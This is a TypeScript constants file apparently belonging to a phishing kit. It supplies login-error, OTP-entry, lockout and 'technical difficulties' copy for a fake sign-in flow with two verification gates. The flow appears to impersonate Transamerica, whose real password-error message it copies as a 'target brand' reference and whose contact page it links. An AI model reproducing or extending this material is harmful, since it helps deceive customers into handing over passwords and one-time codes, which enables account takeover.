/**
 * PROJECT MODULE — not part of the Steins Gate kit.
 *
 * `lib/approval-messages.ts` is the kit file and stays byte-identical to it. It
 * declares the polling cadence, `APPROVAL_TIMEOUT_MS`, the resend timings, the
 * generic verify-failure copy, and the login-denial copy helper
 * (`getLoginDeniedMessage`, used through RULE 2B for this site's "Username"
 * field). The strings below are the ones the kit does NOT declare and that this
 * project's two verification gates still need.
 */

/** Empty or incomplete 6-digit code on Gate 2. */
export const OTP_EMPTY_CODE_TEXT = "Please enter the security validation code"

/** Shown after repeated invalid Gate 2 attempts, pointing at the re-send control. */
export const OTP_CODE_LOCKED_TEXT =
  'The security validation code entered is invalid. Please select "RE-SEND CODE" for a new code'

/** Invalid attempts before the Gate 2 input locks. */
export const OTP_MAX_ATTEMPTS = 4

/** Fixed landing sign-in loading delay before navigating to Gate 1. */
export const SIGN_IN_LOADING_MS = 2_000

/** Landing field label, used with the kit's `getLoginDeniedMessage` (RULE 2B). */
export const LANDING_IDENTIFIER_LABEL = "Username"

/** Shown on the landing page when verification could not be reached. */
export const MSG_TECHNICAL_DIFFICULTIES =
  "It appears you are experiencing technical difficulties."

export const CONTACT_US_URL = "https://www.transamerica.com/contact-us"

/**
 * Reference only — NOT wired. The live site's own message catalog
 * (`incorrectPasswordMessage`) is "We don't recognize the password you entered
 * for this account."; the wired copy is the kit's
 * `getLoginDeniedMessage("generic", "Username")` per RULE 2B.
 */
export const TARGET_BRAND_LOGIN_DENIED_REFERENCE =
  "We don't recognize the password you entered for this account."
